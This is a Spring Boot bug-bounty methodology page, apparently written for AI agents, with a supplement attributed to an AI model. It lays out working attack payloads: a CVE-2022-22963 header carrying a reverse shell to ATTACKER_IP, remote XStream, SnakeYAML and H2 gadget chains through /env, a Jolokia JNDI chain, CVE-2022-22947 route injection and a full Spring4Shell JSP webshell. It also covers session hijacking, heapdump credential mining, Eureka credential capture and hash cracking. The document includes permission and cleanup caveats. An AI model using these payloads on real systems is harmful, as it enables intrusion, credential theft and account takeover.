---
technology: "Spring Boot"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
layer: Spring Boot / actuator / Spring Cloud attack method
version: 1.1
last-refresh: "2026-11-19"
source: "corpus-mined + upstream-verified (spring.io CVE-2022-22963 advisory, Spring Cloud Eureka/Gateway documentation, actuator endpoint docs); 2026-11-19 actuator-depth supplement verified against spring.io/security CVE-2022-22947 + CVE-2022-22965 advisories, CISA KEV, and public PoC checklists (LandGrey/SpringBootVulExploit, HackTricks spring-actuators, spaceraccoon H2 chain, pentest-tools Spring4Shell)"
provenance: "chains distilled from the same gated corpus as the overview page; CVE mechanics and fix versions verified against the vendor advisory before writing, including one correction of a garbled vulnerability description found in a corpus source (the bug is SpEL routing-expression injection, not a Config-Server YAML deserialization issue). 2026-11-19 supplement (claude-opus-4-8): full actuator endpoint inventory by sensitivity, POST /env + /refresh property-hijack RCE chains, heapdump mining workflow, Spring Cloud Gateway CVE-2022-22947 and Spring4Shell CVE-2022-22965 with exact payload shapes, Whitelabel SpEL lineage, discovery fingerprints, and a CTF ladder — appended as a dated Supplement; nothing above it was altered. Companion page: [[spring-boot]]."
---

# Spring Boot — bug-bounty methodology

Companion overview: [[spring-boot]]. Order: fingerprint → actuator → heapdump/env → CVE-2022-22963 → registry abuse → on-disk loot.

## Phase 1 — Fingerprint

- Any error/404 rendering `Whitelabel Error Page` = Spring Boot. Immediately rerun content discovery with `SecLists/Discovery/Web-Content/spring-boot.txt`:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FUZZ \
     -u http://target.example.com/FUZZ -ic -t 100
```

- Verbose stack traces print the Spring Boot version and dependency paths — record them.
- Microservice tells: an extra port like 8761 with HTTP auth (Eureka), nginx `proxy_pass` to a local 8080 (gateway), or `lb://` URIs in any leaked config.
- Source access (LFI, open repo): read `pom.xml` first — the dependency pins decide every CVE below. `spring-cloud-function-web 3.2.2`-style lines are the direct key to Phase 4.

## Phase 2 — Actuator enumeration

`/actuator` (or `/actuator/` trailing variants) lists exposed endpoints as JSON. Priority order once found:

1. `/actuator/mappings` — every route in the app, including admin/export paths the UI never links to. This is the target list for the rest of the test.
2. `/actuator/sessions` — live session IDs with usernames. Take one, set the session cookie in your browser (devtools storage tab or an `editthiscookie`-style extension), and browse the app as that user. Unauthenticated full account takeover, no exploit needed.
3. `/actuator/env` (+ `/actuator/env/<property>` for single values) — configuration properties: DB URLs, credentials, sometimes `spring.cloud.*` settings that reveal the architecture.
4. `/actuator/heapdump` — a downloadable HPROF snapshot (tens of MB). Phase 3.
5. `/actuator/beans`, `/actuator/configprops`, `/actuator/loggers`, `/actuator/health`, `/actuator/metrics` — supporting recon (bean names leak class paths; `loggers` lets you flip log levels to verbose).
6. `jolokia` (where mounted, often under `/actuator/jolokia`): a JMX bridge that historically exposes MBeans leading to RCE — treat any 200 on it as critical and pivot to its known MBean abuse chains (upstream-documented; check the instance before investing).

## Phase 3 — Heapdump credential mining

Download `/actuator/heapdump` and open it in VisualVM (File → Load) or Eclipse MAT. Use the OQL console to dump every string ever resident:

```sql
-- everything (overwhelming):
select s.toString() from java.lang.String s
-- targeted:
select s.toString() from java.lang.String s where s.toString().contains("password")
```

Also grep for `jdbc:`, `secret`, `token`, and connection-pool class names. The heap holds DB credentials, service-registry credentials (the Phase 5 entry), and session objects — with the right query it outperforms hours of endpoint testing. `strings` on the raw file works when no JVM tooling is at hand.

## Phase 4 — CVE-2022-22963 (Spring Cloud Function SpEL RCE)

Verified against the vendor advisory: Spring Cloud Function **3.1.6 and earlier / 3.2.2 and older unsupported versions**, when routing functionality is used, evaluate a user-supplied SpEL routing expression; fixed in **3.1.7 / 3.2.3**. (The vulnerability is command execution via `spring.cloud.function.routing-expression` — descriptions involving Config-Server YAML parsing are conflations.)

Confirm the ingredient: `spring-cloud-function-web` in `pom.xml` within the affected range, or an exposed `/functionRouter` path in `/actuator/mappings`.

```http
POST /functionRouter HTTP/1.1
Host: target.example.com
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,BASE64_BUNDLE}|{base64,-d}|{bash,-i}")
Content-Length: 0
```

The `{echo,..}|{base64,-d}|{bash,..}` brace form sidesteps argument-tokenization (no spaces needed). Generate the bundle: `echo -n "bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1" | base64`. A shell arrives as the service account.

Note the recon dependency chain that made this work in the field: an unrelated LFI reads `pom.xml`, the dependency pin selects the CVE, the header does the rest.

## Phase 5 — Eureka / service-registry abuse (microservice estates)

Layout seen in the field: nginx (80) `proxy_pass` → Spring Cloud Gateway (loopback 8080) → routes by path predicate to `lb://SERVICE-NAME` → gateway resolves instances from Eureka on 8761.

1. Reach Eureka (8761): it sits behind HTTP basic auth — credentials come from the heapdump (`eureka.client.service-url.defaultZone` user:pass embedded in the URL) or leaked config.
2. Read the registry: the dashboard (`/`) lists registered applications (`FURNI`, `USER-MANAGEMENT-SERVICE`-style names); the gateway config in the source tree shows which path predicates (`/login`, `/register`) route to which service name.
3. Register a malicious instance with the target service's name via the REST API (`POST /eureka/apps/<SERVICE-NAME>` with your host/port in the instance metadata — the standard Eureka registration XML/JSON). The gateway's client-side load balancer now has a second "instance" — yours.
4. Wait for real traffic: users' `POST /login` bodies (credentials) arrive at your service; capture and replay them. The instance flip also lets you serve the app's own pages, harvesting session tokens.

This is a trust-boundary attack, not a memory bug: nothing about the gateway is vulnerable except that it believes the registry.

## Phase 6 — On-disk loot (post-shell)

With a shell on the host:

- The fat JAR in `/app` or `/var/www`: `unzip -d /tmp/app app.jar`, then read `BOOT-INF/classes/application.properties` — DB credentials in cleartext (`spring.datasource.username/password`). Connect locally (`psql -h 127.0.0.1 -U ...`), enumerate (`\l`, `\dt`, `select * from users`), crack bcrypt rows with hashcat (mode 3200).
- `~/.m2/settings.xml` — Maven server credentials (plaintext `<password>` for the next internal system).
- Re-run the recon loop: hashes crack → password reuse → SSH (try the DB usernames against the OS user list).

## Phase 7 — Reporting order

Whitelabel + exposed `/actuator/sessions` is a report on its own (session hijack, CVSS-high). `/actuator/env` and `/actuator/heapdump` are separate findings even against the same instance. CVE-2022-22963 reports must pin the observed version against the 3.1.7/3.2.3 fix gates. Eureka findings should be framed as registry-trust abuse: include the fake-instance registration request and the captured credential flow (redacted).

## Tool quick reference

- Discovery: ffuf + the spring-boot wordlist; Burp for session-cookie replay.
- Heap analysis: VisualVM (OQL console) or Eclipse MAT; `strings` for quick triage.
- SpEL RCE: plain curl/Burp with the routing-expression header.
- Hash cracking: hashcat `-m 3200`; DB access via psql.

---

## Supplement — actuator exploitation depth (added 2026-11-19)

*Source: spring.io/security advisories for CVE-2022-22947 and CVE-2022-22965, CISA KEV, and public PoC checklists (LandGrey/SpringBootVulExploit, HackTricks `spring-actuators`, spaceraccoon's H2 "three acts", pentest-tools Spring4Shell). Every fix-version and payload shape re-verified against primary advisories at write time. This extends Phases 2–6; nothing above was rewritten. Authorized-program discipline unchanged — every probe below is single-request and evidence-first, and the write-and-trigger chains (`/env`, `/gateway`, `/functionRouter`, Spring4Shell) MODIFY RUNTIME STATE, so run them only with explicit written permission, prove execution with a benign marker (`id`, a DNS callback, `${7*7}`→`49`), and restore any route/property you create.*

Spring boxes are their own CTF genre, and the ladder is nearly always the same: **Whitelabel fingerprint → exposed actuator → an info endpoint (`/env`, `/heapdump`) that leaks a secret or a property write → RCE.** On a bounty the rungs are identical; what differs is restraint (see the CTF-notes block at the end). This supplement is the full rung-by-rung inventory.

### S1 — Actuator endpoint inventory by sensitivity

Two base paths by major version: **Spring Boot 1.x** mounts endpoints at the root (`/env`, `/health`, `/dump`, `/trace`); **Spring Boot 2.x/3.x** mounts them under `/actuator/` (`/actuator/env`, `/actuator/health`). Always probe both prefixes — a 2.x app occasionally proxies 1.x paths, and the wordlist (`SecLists/.../spring-boot.txt`) covers both. `/actuator` itself returns a JSON `_links` map of everything exposed; that map is ground truth, but brute-force anyway because `management.endpoints.web.exposure.include` can expose an endpoint that is deliberately omitted from the discovery link.

Rank by what each hands you, highest first:

| Endpoint (2.x path) | Class | What it gives the attacker |
|---|---|---|
| `/actuator/env` (+ `/env/{name}`) | **Secrets + write primitive** | DB URLs, cloud keys, `spring.*` config. On many builds it also *accepts writes* (POST) → the Phase-S3 RCE chains. Single-property reads (`/env/spring.datasource.password`) dodge the `******` masking on some versions |
| `/actuator/heapdump` | **Secrets (bulk)** | A full HPROF memory snapshot — every in-memory password, token, session, and JWT signing key. Phase S4 |
| `/actuator/gateway/routes` | **RCE** | Spring Cloud Gateway route table; writable → **CVE-2022-22947 SpEL RCE** (S5) |
| `/actuator/jolokia` | **RCE** | JMX-over-HTTP bridge → logback `reloadByURL` → remote XML → JNDI/XXE (S6) |
| `/actuator/restart`, `/actuator/shutdown` | **RCE-adjacent / DoS** | `restart` re-reads env (makes `/env` writes take effect without `/refresh`); `shutdown` is a one-request outage — **never fire on a bounty** |
| `/actuator/sessions` | **Account takeover** | Live session IDs ↔ usernames — steal a cookie, no exploit (existing Phase 2) |
| `/actuator/mappings` | **Attack-surface map** | Every route incl. `/functionRouter`, admin/export paths — the target list |
| `/actuator/threaddump` (`/dump` in 1.x) | **Secrets (transient)** | Thread stacks can contain in-flight request params, tokens, SQL with literals |
| `/actuator/configprops` | **Secrets + arch** | Bound `@ConfigurationProperties` — datasource, mail, cloud creds, often less-masked than `/env` |
| `/actuator/beans` | **Recon** | Bean names → class paths → which libraries (and thus which CVEs) are present |
| `/actuator/loggers` | **Recon / amplifier** | POST to flip a package to `DEBUG` → verbose secrets in logs (then read via `/logfile`) |
| `/actuator/logfile` | **Secrets** | Streams the log file if `logging.file.*` is set — creds, tokens, stack traces |
| `/actuator/metrics`, `/actuator/health` | **Recon** | `health` with `show-details` leaks component status (DB host, disk paths, Redis) |
| `/actuator/httptrace` / `/httpexchanges` | **Secrets** | Last ~100 requests incl. `Authorization` headers and cookies of *other users* |
| `/actuator/scheduledtasks` | **Recon** | Cron expressions and target bean methods — internal job surface |

Priority once `/actuator` answers: `heapdump` and `env` first (secrets you can mine offline without touching state), then `gateway`/`jolokia`/`functionRouter` (RCE), then `sessions`/`httptrace` (live-credential theft), then the recon set.

### S2 — Discovery fingerprints

Beyond the Whitelabel page (Phase 1), confirm Spring Boot and locate the management port before you spend requests:

```bash
# Whitelabel is the headline tell; also diff the default error JSON shape
curl -s http://target.example.com/nonexistent | grep -i "Whitelabel Error Page"
curl -s http://target.example.com/nonexistent -H 'Accept: application/json'
# -> {"timestamp":"...","status":404,"error":"Not Found","path":"/nonexistent"}
#    the timestamp/status/error/path quartet (no "message" by default on 2.6+) = Spring Boot

# favicon is a stable fingerprint across themed apps
curl -s http://target.example.com/favicon.ico | md5sum   # Spring's leaf-icon hashes are well-known

# Management on a SEPARATE port is the classic misconfig gap (S7). Probe it directly.
for p in 8080 8081 8090 9001 9090 8443; do
  curl -s -o /dev/null -w "%{http_code} :$p/actuator\n" http://target.example.com:$p/actuator
done
```

Signals: `X-Application-Context` header (1.x; leaks app name/instance), Tomcat/Jetty error chrome, `Set-Cookie: JSESSIONID`, and the `/actuator` JSON `_links` body. In source or an image, `spring-boot-starter-actuator` in `pom.xml`/`build.gradle` plus `management.endpoints.web.exposure.include=*` is the smoking gun — that one line turns every S1 endpoint on.

### S3 — POST /env + /refresh property-hijack RCE chains

If `/env` accepts writes, you can rewrite the running config and then force a reload. **This is the highest-impact actuator finding short of a writable gateway.** Two things must hold: `/env` POST returns 200 (not 405/404), and you can reload — either `/actuator/refresh` (needs `spring-cloud-context` / `@RefreshScope`) or `/actuator/restart` (needs `spring-boot-starter-actuator` restart endpoint; heavier, re-reads *all* env).

Request shapes differ by version:

```http
# Spring Boot 1.x — form-encoded
POST /env HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: NN

eureka.client.serviceUrl.defaultZone=http://198.51.100.10/openhook
```

```http
# Spring Boot 2.x/3.x — JSON
POST /actuator/env HTTP/1.1
Host: target.example.com
Content-Type: application/json
Content-Length: NN

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://198.51.100.10/openhook"}
```

```http
# then make it take effect
POST /actuator/refresh HTTP/1.1
Host: target.example.com
Content-Length: 0
```

**Chain A — Eureka XStream deserialization (needs `eureka-client` < 1.8.7).** Point `eureka.client.serviceUrl.defaultZone` at your HTTP server, then `/refresh`. The client fetches your `/openhook` (and `/apps/` registry XML) and XStream-deserializes it unsafely → RCE. Serve a classic XStream gadget (e.g. an `ImageIO`/`ProcessBuilder` chain) from `198.51.100.10`. This is the single most common "spring box" rung after a readable `/env`.

**Chain B — SnakeYAML via `spring.cloud.bootstrap.location` (needs `snakeyaml` + bootstrap support).** Set the property to a remote YAML URL, `/refresh`, and the app parses attacker YAML. The payload is the canonical SnakeYAML `ScriptEngineManager` gadget:

```yaml
# served at http://198.51.100.10/x.yml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://198.51.100.10/gadget.jar"]
  ]]
]
```

**Chain C — H2 JDBC `CREATE ALIAS` RCE (needs `h2` on the classpath — spaceraccoon's "three acts").** Rewrite the datasource to an H2 URL whose `INIT` runs a Java-stored-procedure alias, then `/refresh` to re-init the pool:

```json
{"name":"spring.datasource.url",
 "value":"jdbc:h2:mem:testdb;INIT=CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"x\"\\;}')\\;CALL EXEC('id')"}
```

Driver/dialect pins matter; some stacks need `spring.datasource.driver-class-name=org.h2.Driver` set the same way first. If the app ships the **H2 web console** (`/h2-console`, or `spring.h2.console.enabled=true`), that is a standalone RCE surface — the console's JDBC URL field takes the same `INIT=CREATE ALIAS` trick with no actuator needed.

**Chain D — logback via `logging.config` + jolokia.** Overlaps S6; set `logging.config=http://198.51.100.10/logback.xml` and reload.

**Masking bypass for reads:** on versions that mask values as `******` in the full `/env` dump, request the single property path — `GET /actuator/env/spring.datasource.password` — which historically returned the cleartext `"value"`. Always try both.

### S4 — Heapdump credential mining (workflow)

`/actuator/heapdump` streams an HPROF binary (tens to hundreds of MB). It is the richest single artifact on the target: anything the JVM touched in memory is in it — DB passwords, API keys, OAuth client secrets, JWT HMAC/RSA signing keys, session objects, and decrypted config. Three workflows by tooling available:

```bash
# 0. Download. Note Content-Type: some builds serve gzip; file(1) tells you.
curl -s http://target.example.com/actuator/heapdump -o heapdump.hprof
file heapdump.hprof   # "Java HPROF dump" (or gzip -> gunzip first)

# 1. Fast triage, no JVM tooling — strings + targeted grep
strings -n 8 heapdump.hprof | grep -iE 'password|passwd|secret|token|api[_-]?key|jdbc:|bearer|private key|BEGIN RSA' | sort -u

# 2. Purpose-built: JDumpSpider (one-shot structured extractor for Spring heapdumps)
java -jar JDumpSpider.jar heapdump.hprof    # auto-pulls datasource creds, JWT keys, cloud keys, env
```

For precision use **Eclipse MAT** (Memory Analyzer) and its OQL console, or VisualVM (Phase 3):

```sql
-- every String containing a marker (MAT OQL)
SELECT toString(s) FROM java.lang.String s WHERE toString(s) LIKE ".*(?i)(password|secret|jdbc:|bearer).*"
-- Spring's property source holds resolved config values in the clear:
SELECT * FROM org.springframework.core.env.MapPropertySource
-- char[] backing arrays sometimes hold what String views have been GC'd:
SELECT toString(a) FROM char[] a WHERE toString(a) LIKE ".*password.*"
```

Expected loot and where it leads: `spring.datasource.password` → DB (Phase 6); `jwt`/`signing`/`hmac` bytes → **forge arbitrary tokens offline** (the heapdump defeats the whole auth layer — pull the HS256 secret or the RSA private key and mint an admin JWT); `eureka.client.service-url.defaultZone` with embedded `user:pass` → Phase 5 registry abuse; AWS/GCP/Azure keys → cloud pivot. **Report note:** a heapdump is bulk PII/secret exposure — in evidence, redact everything except the field *names* and a single masked proof value; never attach the raw `.hprof`.

### S5 — Spring Cloud Gateway RCE (CVE-2022-22947, exact shapes)

**CVSS 10.0, CISA KEV.** When the Gateway actuator endpoint is enabled, exposed, and unsecured, a route definition's filter value is evaluated against a full `StandardEvaluationContext` — unrestricted SpEL. Affected: `spring-cloud-gateway` **≤ 3.0.6** and **3.1.0**; fixed in **3.0.7 / 3.1.1** (Spring Cloud 2021.0.1), which swaps in a restricted `GatewayEvaluationContext`. Confirm the surface with `GET /actuator/gateway/routes` (200 + JSON array).

The exploit is a four-step add → refresh → trigger → clean sequence:

```http
# 1. Create a route whose AddResponseHeader filter carries a SpEL payload
POST /actuator/gateway/routes/ratpoc HTTP/1.1
Host: target.example.com
Content-Type: application/json

{
  "id": "ratpoc",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "order": 0
}
```

```http
# 2. Apply the new route table
POST /actuator/gateway/refresh HTTP/1.1
Host: target.example.com
Content-Length: 0
```

```http
# 3. Trigger evaluation — the command output comes back in the Result response header
GET /actuator/gateway/routes/ratpoc HTTP/1.1
Host: target.example.com
```

```http
# 4. MANDATORY cleanup — delete the route and refresh again, leave no artifact
DELETE /actuator/gateway/routes/ratpoc HTTP/1.1
Host: target.example.com
```
```http
POST /actuator/gateway/refresh HTTP/1.1
Host: target.example.com
Content-Length: 0
```

Step 3's response echoes the command output in the `Result` header (the `exec(new String[]{...})` array form avoids the whitespace-tokenization problem for multi-arg commands — use `{"bash","-c","id"}` for anything with pipes/redirs). Keep the PoC to `id`/`whoami`; prove execution, do not stage a shell on a bounty. The `/actuator/gateway/refresh` endpoint in access logs next to `/routes/` POSTs is also the standard detection signature, so a single clean run plus cleanup is the disciplined footprint.

### S6 — Jolokia, Eureka, H2, and other optional-dependency consoles

Any 200 on `/actuator/jolokia` (or 1.x `/jolokia`) is critical: it is JMX over HTTP, so every registered MBean is reachable. The canonical chain is logback's `reloadByURL`:

```
GET /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/198.51.100.10!/logback.xml
```

Your hosted `logback.xml` then does the work — blind XXE, or RCE via a JNDI insert:

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://198.51.100.10:1389/exploit" as="appName" />
</configuration>
```

Pair the JNDI leg with a marshalsec/rogue-LDAP server returning a reference class; whether it reaches RCE depends on the JDK's `com.sun.jndi.ldap.object.trustURLCodebase` posture (the Log4Shell-era gate). Jolokia can also reach other MBeans — hunt `C3P0`/`Tomcat` datasource MBeans and `Memory`/`Diagnostic` beans for a heapdump trigger.

**Eureka (8761)** — covered in Phase 5; the actuator angle is that `/env` or the heapdump hands you the `defaultZone` credentials that make the registry reachable in the first place.

**Optional-dependency consoles worth a dedicated probe** (each is RCE or heavy info-leak when present):

| Console | Path(s) | Impact |
|---|---|---|
| H2 database | `/h2-console`, `/h2` | JDBC-URL `INIT=CREATE ALIAS` → RCE (S3 Chain C), no actuator needed |
| Spring Boot Admin | `/admin`, `/applications` | aggregates *other* instances' actuators — one panel, many targets' `/env`/`/heapdump` |
| Swagger / OpenAPI | `/swagger-ui.html`, `/v3/api-docs` | full route + model map (BOLA/mass-assignment surface) |
| Spring Cloud Config | `/{app}/{profile}`, `/env`, `/encrypt`, `/decrypt` | config-server secrets; `/decrypt` can reveal cipher secrets |
| GraphQL/GraphiQL | `/graphiql`, `/graphql` | introspection + resolver BOLA |

### S7 — Actuator security misconfiguration patterns

The reason actuators are exposed at all is a history of changing defaults:

- **Spring Boot 1.0–1.4:** sensitive endpoints were reachable **unauthenticated by default** — if you find a genuine 1.x app, assume everything is open.
- **Spring Boot 1.5:** introduced `management.security.enabled=true` as the default, gating sensitive endpoints — but countless apps shipped `management.security.enabled=false` (copied from a tutorial) to "fix" a broken dashboard, re-opening everything. Grep source/images for that exact line.
- **Spring Boot 2.x:** the property was **removed**; only `/health` and `/info` are exposed over HTTP by default, and everything else requires `management.endpoints.web.exposure.include`. The modern misconfig is `include=*` with no Spring Security on the management context — extremely common, because `*` is the fastest way to make monitoring "work."
- **Port separation (`management.server.port`):** operators move actuators to a second port (e.g. 8081/9001) thinking a firewall hides it — but the port is often reachable (S2 probe), and worse, Spring Security filters configured for the main port frequently **do not apply** to the management port, so the "hidden" port is wide open. Always scan the management port separately and re-run the whole S1 inventory against it.
- **Context-path confusion:** `/actuator` may be relocated via `management.endpoints.web.base-path`; if `/actuator` 404s but Whitelabel says Spring Boot, brute-force alternate bases (`/manage`, `/admin/actuator`, `/monitoring`).

### S8 — Whitelabel / SpEL injection lineage

The Whitelabel error page is also an **expression-evaluation oracle**. Where user input (a path segment, parameter, or header) is reflected into an error view rendered by a template engine that evaluates expressions, a probe tells you which interpreter is live:

```bash
# reflect a marker into the error page / any reflecting field and look for 49
curl -s  'http://target.example.com/${7*7}'          # SpEL (Spring)
curl -s  'http://target.example.com/%24%7B7*7%7D'    # URL-encoded form
curl -s  'http://target.example.com/#{7*7}'          # template/EL form
curl -sG 'http://target.example.com/search' --data-urlencode 'q=${7*7}'
```

A reflected `49` (or `${14*3}`→`42`) means the value hit an expression engine — escalate to a SpEL body gadget (`T(java.lang.Runtime).getRuntime().exec(...)`). This "`${7*7}`→`49`" probe is the Spring sibling of the Jinja2 `{{7*7}}` SSTI test. The SpEL-injection family this lineage belongs to, newest to oldest, for matching an observed engine to a known bug:

| CVE | Component | Where the SpEL lands | Fixed |
|---|---|---|---|
| CVE-2022-22947 | Spring Cloud Gateway | Actuator route filter value (S5) | 3.0.7 / 3.1.1 |
| CVE-2022-22963 | Spring Cloud Function | `spring.cloud.function.routing-expression` header (Phase 4) | 3.1.7 / 3.2.3 |
| CVE-2022-22950 | Spring Framework | Crafted SpEL → DoS (not RCE) | 5.2.20 / 5.3.17 |
| CVE-2018-1273 | Spring Data Commons | Property-path binding: `name[T(...).exec()]` on form POSTs | 1.13.11 / 2.0.6 |
| CVE-2017-8046 | Spring Data REST | JSON-Patch `path` field → SpEL (PATCH requests) | 2.6.9 / 3.0.1 |

CVE-2018-1273's payload shape is worth keeping because the sink is a plain bound form field, not an actuator:

```
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("id")]=x&password=x&repeatedPassword=x
```

### S9 — Spring4Shell (CVE-2022-22965, exact payload)

Distinct from every actuator bug: a **data-binding** flaw in Spring Framework Core (`spring-webmvc`/`spring-webflux`) — not Spring Boot specific, but Spring Boot WAR deployments are the prime target. A reintroduction of the 2010 `CVE-2010-1622` class-loader bypass, reachable on **JDK 9+** because `class.module.classLoader` became navigable. Affected: Spring Framework **5.3.0–5.3.17** and **5.2.0–5.2.19** (and older); fixed in **5.3.18 / 5.2.20**. Preconditions in the public PoC: deployed as a **WAR on Apache Tomcat** (the default executable-jar packaging is *not* exploitable by the known chain), JDK 9+, and a controller binding request params to a POJO.

Benign detection first — a probe that only toggles a Tomcat property and returns a tell without writing a file:

```bash
# 400 Bad Request on this (but 200 on a normal request) = the class.* path is reachable
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://target.example.com/path?class.module.classLoader.URLs%5B0%5D=0'
```

The weaponized chain rewrites Tomcat's `AccessLogValve` to write a JSP webshell into `webapps/ROOT`. The canonical payload sends the file content via request *headers* (to smuggle the `<%`/`%>` markers past parsing) referenced by `%{...}i` placeholders in the log `pattern`:

```http
POST /path HTTP/1.1
Host: target.example.com
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: NN

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

The five `...pipeline.first.*` properties are: `pattern` (the log line = the JSP body), `suffix=.jsp` (file extension), `directory=webapps/ROOT` (web-reachable dir), `prefix=tomcatwar` (filename), and `fileDateFormat=` (blank, so no timestamp breaks the name). A benign normal request flushes the valve and writes the file; then:

```bash
curl 'http://target.example.com/tomcatwar.jsp?pwd=j&cmd=id'    # -> command output
```

**Bounty discipline:** writing a webshell is a destructive, persistent change. Prefer the benign `class.module.classLoader.URLs[0]=0` oracle (the 400-vs-200 diff) as proof, cite the version, and request permission before dropping any JSP; if you must, use a password-gated shell (`pwd=j` above), record the exact path, and delete it as cleanup.

### S10 — CTF notes: the spring-box ladder

Spring Boot is a recurring CTF archetype (HTB, THM, countless "actuator" rooms). The intended path is almost always: **Whitelabel/favicon fingerprint → `/actuator` (or `/env` on 1.x) → read a secret from `/env`/`/heapdump`/`/configprops`, or write one via `/env`+`/refresh` → RCE → user → DB creds in the fat JAR (`BOOT-INF/classes/application.properties`) → root via reuse.** `JDumpSpider`/`strings` on a heapdump is frequently the whole "foothold" step, and a writable gateway or an H2 console is the standard "it's trivially RCE once you notice it" twist.

What differs CTF vs bounty:
- **CTF:** fire `/shutdown`, drop a full reverse shell, mint JWTs from the leaked key, iterate loudly — there is no blast radius and the flag is the point. SnakeYAML/XStream/H2 gadget JARs hosted off a `python3 -m http.server` are expected.
- **Bounty:** the same endpoints are the finding, but each state-changing step needs permission and cleanup. Reading `/env` is one report; a writable `/env` is a *separate, higher* report even before you chain it — demonstrate the write primitive with a harmless property and stop. Never run `/shutdown` or `/restart`. Prove gateway/Spring4Shell RCE with `id` and a mandatory teardown, and treat the heapdump as regulated data (redact, do not retain). The ladder is identical; only the last rung's recklessness changes.

*Supplement researched and written 2026-11-19 (model: claude-opus-4-8). Sources: spring.io/security/cve-2022-22947 and spring.io/security/cve-2022-22965 (VMware/Spring advisories); CISA KEV (CVE-2022-22947); NVD CVE-2022-22965, CVE-2022-22963, CVE-2018-1273, CVE-2017-8046; HackTricks `spring-actuators` (blog.1nf1n1ty.team mirror); LandGrey/SpringBootVulExploit checklist; spaceraccoon "Remote Code Execution in Three Acts: Chaining Exposed Actuators and H2 Database"; pentest-tools.com Spring4Shell detect/exploit guide; Trend Micro and Microsoft Spring4Shell analyses. Fix versions and payload shapes verified against the primary advisories above; no CVE IDs, flags, or version numbers invented.*
